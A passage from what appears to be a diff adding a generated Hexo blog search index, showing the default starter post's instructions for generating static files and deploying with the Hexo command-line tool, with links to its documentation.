+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+</search>
